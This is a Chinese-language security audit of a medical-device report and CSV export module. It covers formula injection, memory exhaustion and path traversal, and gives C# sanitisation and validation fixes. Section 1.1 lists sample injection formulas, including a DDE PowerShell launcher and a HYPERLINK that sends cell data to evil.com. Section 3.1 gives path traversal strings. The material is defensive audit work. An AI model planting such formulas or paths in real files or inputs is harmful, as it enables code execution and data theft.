## 1. Excel 注入攻擊（Excel Injection / CSV Injection）

### 1.1 攻擊向量說明

當 Excel 開啟後，若儲存格內容以 `=`、`+`、`-`、`@`、`\t`、`\r` 開頭，Excel 會將其**視為公式並自動執行**。攻擊者可透過操控 DB 欄位內容，注入惡意公式：

```
=CMD|'/C powershell -e <base64>'!A0
=HYPERLINK("http://evil.com/steal?d="&A1, "Click Me")
+cmd|'/C calc'!A0
```

### 1.2 風險欄位盤點

| 檔案 | 來源屬性 | 風險等級 | 說明 |
|------|---------|---------|------|
| `ExcelReportGenerator` L88 | `s.ConcentrationDisplay` | 🟡 中 | 字串值直接寫入 `.Value`，可被注入 |
| `ExcelReportGenerator` L92 | `s.SampleId` | 🔴 高 | **使用者自由輸入欄位**，最容易被注入 |
| `ExcelReportGenerator` L93 | `s.ElutionTubeId` | 🔴 高 | **使用者自由輸入欄位** |
| `ExcelReportGenerator` L275 | `CustomPcrSetupJson` 內的值 | 🟡 中 | JSON 解析後直接寫入儲存格 |
| `DataExportService` L190 | `CsvEscape(s.ConcentrationDisplay)` | 🟡 中 | `CsvEscape` **只做引號跳脫**，不防公式前綴 |
| `DataExportService` L195 | `CsvEscape(s.SampleId)` | 🔴 高 | 同上，使用者輸入 |
| `DataExportService` L196 | `CsvEscape(s.ElutionTubeId)` | 🔴 高 | 同上 |

### 1.3 當前防護現狀

> [!WARNING]
> **ExcelReportGenerator**：完全沒有任何公式注入防護。ClosedXML 的 `cell.Value = string` 賦值方式不會自動消毒。
>
> **DataExportService (CSV)**：`CsvEscape()` 僅處理逗號與引號，**未處理公式前綴字元**。

### 1.4 修復方案

新增 `SanitizeCellValue()` 方法，對所有使用者可控的字串值進行消毒：

```csharp
/// <summary>
/// 消毒儲存格內容，防止 Excel 公式注入攻擊
/// 若字串以危險字元開頭（=, +, -, @, \t, \r），加上單引號前綴使 Excel 視為純文字
/// </summary>
private static string SanitizeCellValue(string? value)
{
    if (string.IsNullOrEmpty(value)) return "";
    char first = value[0];
    if (first == '=' || first == '+' || first == '-' || first == '@' ||
        first == '\t' || first == '\r')
    {
        return "'" + value;   // 單引號前綴：Excel 會顯示原始文字，不執行公式
    }
    return value;
}
```

**需套用到的位置：**
- `ExcelReportGenerator`：所有 `s.SampleId`、`s.ElutionTubeId`、`s.ConcentrationDisplay`、`CustomPcrSetupJson` 解析值
- `DataExportService`：在 `CsvEscape` 前先呼叫 `SanitizeCellValue`

## 2. 阻斷服務攻擊（DoS / Memory Exhaustion）

### 2.1 攻擊向量說明

當未來串接 LIS/LIMS 時，可能出現：
- 單筆 TestRecord 關聯**大量 SampleResult**（數十萬筆惡意資料）
- 批次匯出時 `recordIds.Count` 極大
- `CustomPcrSetupJson` 包含**巨大 JSON 物件**（JSON bomb / deeply nested）

### 2.2 風險點盤點

| 位置 | 風險 | 說明 |
|------|------|------|
| `ExcelReportGenerator` L81 | `.ToList()` 全量載入 | SampleResults 不限數量，全量載入記憶體 |
| `ExcelReportGenerator` L32 | `ws.Columns().AdjustToContents()` | 資料量大時，ClosedXML 會遍歷所有欄位所有行計算寬度，CPU 密集 |
| `DataExportService` L93 | `.Include(r => r.SampleResults)` | EF Core eager loading，無分頁上限 |
| `DataExportService` L68 | `for` 迴圈無上限 | `recordIds.Count` 未限制 |
| `ExcelReportGenerator` L293 | `JsonSerializer.Deserialize` | 無 `MaxDepth` 限制，大 JSON 可消耗記憶體 |

### 2.3 當前防護現狀

> [!WARNING]
> **目前完全沒有任何數量限制或記憶體防護機制。** 雖然目前的醫療裝置場景下，單次實驗最多 24 個樣本、批次匯出通常不超過數百筆，但未來與 LIS 串接後風險會提高。

## 3. 本地檔案路徑安全（Path Traversal）

### 3.1 攻擊向量說明

`record.RunId` 作為資料夾名稱直接用於 `Path.Combine`。若 RunId 含有路徑穿越字元：

```
RunId = "..\..\Windows\System32\malicious"
RunId = "test/../../etc/passwd"
```

將導致檔案被寫入非預期位置。

### 3.2 風險點盤點

| 位置 | 程式碼 | 風險 |
|------|--------|------|
| `DataExportService` L144 | `Path.Combine(driveLetter, "trio_data", record.RunId)` | 🔴 高 |
| `DataExportService` L204 | `Path.Combine(baseDir, $"{record.RunId}.xlsx")` | 🔴 高 |

### 3.3 當前防護現狀

> [!CAUTION]
> **完全沒有 RunId 合法性驗證。** `Path.Combine` 在 `record.RunId` 包含 `..` 或 `/` 時**不會報錯**，而是靜默地產生穿越路徑。

### 3.4 修復方案

```csharp
/// <summary>
/// 驗證 RunId 是否為安全的檔名（只允許數字、字母、底線、連字號）
/// </summary>
private static string ValidateRunId(string runId)
{
    if (string.IsNullOrWhiteSpace(runId))
        throw new ArgumentException("RunId cannot be empty");

    // 只允許 yyyyMMdd_HHmmss 格式（數字 + 底線）
    if (!System.Text.RegularExpressions.Regex.IsMatch(runId, @"^[\w\-]+$"))
        throw new ArgumentException($"RunId contains invalid characters: {runId}");

    // 額外防禦：確認無路徑穿越
    if (runId.Contains("..") || runId.Contains('/') || runId.Contains('\\'))
        throw new ArgumentException($"RunId contains path traversal characters: {runId}");

    return runId;
}

// 在 ExportSingleRecordAsync 開頭使用：
private async Task ExportSingleRecordAsync(TestRecord record, string driveLetter)
{
    var safeRunId = ValidateRunId(record.RunId);
    var baseDir = Path.Combine(driveLetter, "trio_data", safeRunId);
    
    // 額外驗證：最終路徑必須落在 USB 根目錄下
    var fullPath = Path.GetFullPath(baseDir);
    var expectedRoot = Path.GetFullPath(Path.Combine(driveLetter, "trio_data"));
    if (!fullPath.StartsWith(expectedRoot, StringComparison.OrdinalIgnoreCase))
        throw new UnauthorizedAccessException(
            $"Path traversal detected: {fullPath} is outside {expectedRoot}");
    // ...
}
```

## 風險矩陣總覽

| 風險類型 | 當前狀態 | 嚴重性 | 可利用性 | 修復優先級 |
|---------|---------|--------|---------|-----------|
| Excel Injection (xlsx) | ❌ 無防護 | 高 | 需操控 DB | **P1** |
| CSV Injection (csv) | ❌ 無防護 | 高 | 需操控 DB | **P1** |
| Path Traversal | ❌ 無防護 | 嚴重 | 需操控 DB | **P0** |
| Memory Exhaustion | ❌ 無防護 | 中 | 需大量資料或串接 LIS | **P2** |
| JSON Bomb | ❌ 無防護 | 中 | 需操控 DB | **P2** |

> [!IMPORTANT]
> **可利用性說明**：目前這些攻擊向量都需要**先操控 DB 欄位內容**才能觸發。在當前離線封閉醫療裝置場景下，風險相對可控。但未來串接 LIS/LIMS 後，外部系統可能直接將使用者輸入的 SampleId 寫入 DB，攻擊面將大幅擴大。建議在當前階段就先加入防護。

---

## 建議修復順序

1. **P0 — Path Traversal**：RunId 驗證 + 最終路徑歸屬檢查
2. **P1 — Excel/CSV Injection**：新增 `SanitizeCellValue()`，套用至所有使用者可控欄位
3. **P2 — DoS 防護**：加入 SampleResult 筆數上限、JSON 大小限制、批次匯出上限
